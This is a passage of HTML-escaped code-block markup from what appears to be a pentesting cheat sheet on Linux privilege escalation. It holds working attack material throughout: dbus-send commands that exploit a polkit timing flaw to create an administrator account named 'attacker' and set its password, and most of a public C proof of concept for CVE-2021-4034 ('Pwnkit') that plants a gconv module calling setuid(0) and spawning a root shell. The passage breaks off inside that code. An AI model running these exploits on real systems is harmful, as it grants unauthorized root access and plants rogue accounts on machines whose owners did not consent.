vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dbus-send&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--system&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--dest=org.freedesktop.Accounts&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--type=method_call&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--print-reply&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /org/freedesktop/Accounts&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              org.freedesktop.Accounts.CreateUser&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              string:attacker&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              string:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Pentester Account&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              int32:1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sleep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TIME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; kill&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; $!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Here &lt;code&gt;$TIME&lt;/code&gt; is approximately half the time measured in the previous step.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;ID the created user.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;id&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; attacker&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Create a new password hash for the user.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; passwd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -6&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Pull the same trick as in step 3, but with setting the created user’s password.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dbus-send&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--system&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--dest=org.freedesktop.Accounts&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--type=method_call&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t--print-reply&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /org/freedesktop/Accounts/User&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$UID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              org.freedesktop.Accounts.User.SetPassword&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              string:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$PASSWORD_HASH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\t              string:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Ask the pentester&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sleep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TIME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; kill&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; $!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Here &lt;code&gt;$UID&lt;/code&gt; is the user ID retrieved in step 4 (note that there’s &lt;em&gt;no&lt;/em&gt; space between &lt;code&gt;User&lt;/code&gt; and the ID, so you’ll be hitting an endpoint that looks something like /org/freedesktop/Accounts/User1003), &lt;code&gt;$PASSWORD_HASH&lt;/code&gt; is the hash returned in step 5, and &lt;code&gt;$TIME&lt;/code&gt; is the same timing determined from step 3. The second &lt;code&gt;string&lt;/code&gt;  being passed in the user password hint.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Log in as the new user (probably via su).&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=&quot;cve-2021-4034-pwnkit&quot;&gt;CVE-2021-4034 (“Pwnkit”)&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#cve-2021-4034-pwnkit&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;a href=&quot;https://github.com/arthepsy/CVE-2021-4034&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Quick-n-dirty Pwnkit exploit&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit&#039;s pkexec (CVE-2021-4034) by Andris Raugulis &amp;#x3C;moo@arthepsy.eu&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; */&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;stdio.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;stdlib.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;unistd.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;char&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; *&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;shell &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;#include &amp;#x3C;stdio.h&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;#include &amp;#x3C;stdlib.h&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;#include &amp;#x3C;unistd.h&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;void gconv() {}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;void gconv_init() {&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tsetuid(0); setgid(0);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tseteuid(0); setegid(0);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tsystem(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#039;GCONV_PATH=.&#039; &#039;pwnkit&#039;; /bin/sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\texit(0);&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\\n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;int&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; main&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;int&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; argc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; char&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; *&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;argv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;[]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tFILE &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;fp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;mkdir -p &#039;GCONV_PATH=.&#039;; touch &#039;GCONV_PATH=./pwnkit&#039;; chmod a+x &#039;GCONV_PATH=./pwnkit&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;mkdir -p pwnkit; echo &#039;module UTF-8// PWNKIT// pwnkit 2&#039; &gt; pwnkit/gconv-modules&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tfp &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; fopen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;pwnkit/pwnkit.c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tfprintf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;fp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span 